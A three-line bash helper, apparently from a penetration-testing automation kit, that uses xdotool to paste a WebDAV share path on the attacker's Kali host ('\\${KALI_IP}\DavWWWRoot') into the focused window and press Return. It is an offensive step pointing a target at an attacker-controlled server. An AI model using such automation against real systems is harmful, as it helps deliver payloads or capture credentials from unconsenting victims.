#!/bin/bash

: '
get wsgidav server share address
'

paste_command "\\${KALI_IP}\DavWWWRoot"
xdotool key Return
